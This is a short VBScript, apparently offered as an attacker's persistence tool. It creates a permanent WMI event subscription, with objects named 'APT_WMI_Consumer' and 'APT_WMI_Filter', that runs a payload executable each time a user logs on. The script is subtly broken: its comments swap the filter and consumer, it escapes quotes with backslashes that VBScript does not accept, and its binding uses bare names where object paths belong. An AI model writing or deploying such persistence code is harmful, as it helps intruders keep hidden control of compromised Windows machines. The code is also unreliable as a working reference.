' VBScript to create a permanent WMI event subscription for persistence.
' This script executes a payload upon user logon.

strComputer = "."
Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\subscription")

' Create a filter for logon events
Set objFilter = objWMIService.Get("ActiveScriptEventConsumer").SpawnInstance_()
objFilter.ScriptingEngine = "VBScript"
objFilter.ScriptText = "Set objShell = CreateObject(\"WScript.Shell\")" & vbCrLf & _
                       "objShell.Run \"C:\\path\\to\\payload.exe\""
objFilter.Name = "APT_WMI_Consumer"
Set objPath = objFilter.Put_()

' Create a consumer
Set objConsumer = objWMIService.Get("__EventFilter").SpawnInstance_()
objConsumer.Query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_LogonSession'"
objConsumer.QueryLanguage = "WQL"
objConsumer.Name = "APT_WMI_Filter"
Set objPath = objConsumer.Put_()

' Bind the filter to the consumer
Set objBinding = objWMIService.Get("__FilterToConsumerBinding").SpawnInstance_()
objBinding.Filter = "APT_WMI_Filter"
objBinding.Consumer = "APT_WMI_Consumer"
Set objPath = objBinding.Put_()

